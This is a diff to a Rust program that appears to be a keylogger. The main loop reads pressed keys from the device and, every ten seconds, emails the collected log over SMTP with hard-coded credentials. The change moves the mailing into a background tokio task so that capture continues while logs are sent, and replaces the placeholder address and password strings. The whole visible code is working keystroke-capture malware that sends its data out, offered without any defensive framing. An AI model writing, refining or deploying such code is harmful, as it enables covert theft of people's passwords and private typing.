@@ -7,6 +7,7 @@ use lettre_email::{Email, EmailBuilder};
 use lettre::smtp::authentication::Credentials;
 use lettre::{SmtpClient, SmtpTransport, Transport};
 use std::path::Path;
+use tokio::task;
 
 #[tokio::main]
 async fn main() {
@@ -20,16 +21,26 @@ async fn main() {
     let mail_sending_interval = Duration::from_secs(10);
 
     // Set up your email stuff here:
-    let to_mail_address = "your.mail@something.com";
+    let to_mail_address = "your email";
     let from_mail_address = to_mail_address;
-    let from_mail_address_password = "password";
+    let from_mail_address_password = "one time password";
     
     loop {
         loop {
             let keys: Vec<Keycode> = device_state.get_keys();
+            // Check if it's time to send an email
             if sys_time.elapsed().unwrap() >= mail_sending_interval {
-                send_mail(&to_mail_address, &from_mail_address, &from_mail_address_password, &date).await;
-                sys_time = SystemTime::now();
+                let email_content = date.to_string(); // Copy current logs
+                let to = to_mail_address.to_string();
+                let from = from_mail_address.to_string();
+                let pass = from_mail_address_password.to_string();
+
+                // Spawn a separate task for email sending
+                task::spawn(async move {
+                    send_mail(&to, &from, &pass, &email_content).await;
+                });
+
+                sys_time = SystemTime::now(); // Reset the timer
             }
             
             if !keys.is_empty(){
